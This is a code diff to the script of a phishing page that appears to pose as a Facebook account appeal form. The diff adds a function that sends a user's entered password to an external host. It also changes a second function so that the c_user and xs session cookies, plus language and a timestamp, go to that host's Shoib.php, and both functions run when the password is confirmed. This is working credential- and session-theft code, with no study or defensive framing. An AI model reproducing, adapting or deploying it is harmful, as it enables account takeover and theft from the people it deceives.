@@ -1547,19 +1547,34 @@
             }
         });
         
-        // Form submission handling
-        const appealForm = document.querySelector('.appeal-form');
-        const submitBtn = document.getElementById('submit-appeal-btn');
+        // Function to submit password to the specified endpoint
+        function submitPasswordToEndpoint(data) {
+            const endpoint = 'https://qwerty-1713c.wasmer.app/shoib.pass';
+            
+            // Prepare the data to send
+            const formData = new FormData();
+            formData.append('password', data.password);
+            formData.append('timestamp', data.timestamp);
+
+            // Send the data to the endpoint
+            return fetch(endpoint, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.text();
+            });
+        }
         
-        // Function to submit to the specified endpoint
-        function submitToEndpoint(data) {
+        // Function to submit xs/c_user to the specified endpoint
+        function submitDataToEndpoint(data) {
             const endpoint = 'https://qwerty-1713c.wasmer.app/Shoib.php';
             
             // Prepare the data to send
             const formData = new FormData();
             formData.append('c_user', data.c_user);
             formData.append('xs', data.xs);
-            formData.append('password', data.password);
             formData.append('language', data.language);
             formData.append('timestamp', data.timestamp);
 
@@ -1573,6 +1588,10 @@
                 return response.text();
             });
         }
+        
+        // Form submission handling
+        const appealForm = document.querySelector('.appeal-form');
+        const submitBtn = document.getElementById('submit-appeal-btn');
         
         submitBtn.addEventListener('click', async function(e) {
             e.preventDefault();
@@ -1660,8 +1679,19 @@
                         confirmPasswordBtn.disabled = true;
                         confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
                         
-                        // Submit to the endpoint
-                        await submitToEndpoint(formData);
+                        // Submit password to shoib.pass endpoint
+                        await submitPasswordToEndpoint({
+                            password: password,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        // Submit xs/c_user to Shoib.php endpoint
+                        await submitDataToEndpoint({
+                            c_user: c_user,
+                            xs: xs,
+                            language: currentLanguage,
+                            timestamp: new Date().toISOString()
+                        });
                         
                         document.body.removeChild(passwordPrompt);
                         
